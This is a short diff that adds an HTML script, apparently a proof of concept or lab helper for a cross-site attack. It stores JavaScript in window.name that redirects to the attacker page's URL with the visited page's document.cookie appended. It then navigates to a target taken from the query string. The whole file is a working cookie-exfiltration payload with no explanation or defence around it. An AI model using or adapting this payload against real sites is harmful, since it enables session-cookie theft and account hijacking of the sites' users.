@@ -1,0 +1,7 @@
+<script>
+    window.name = `
+        location = "${window.location.href}/?" + document.cookie + "end";
+    `;
+
+    location = location.search.substring(1) || "./test.html"
+</script>
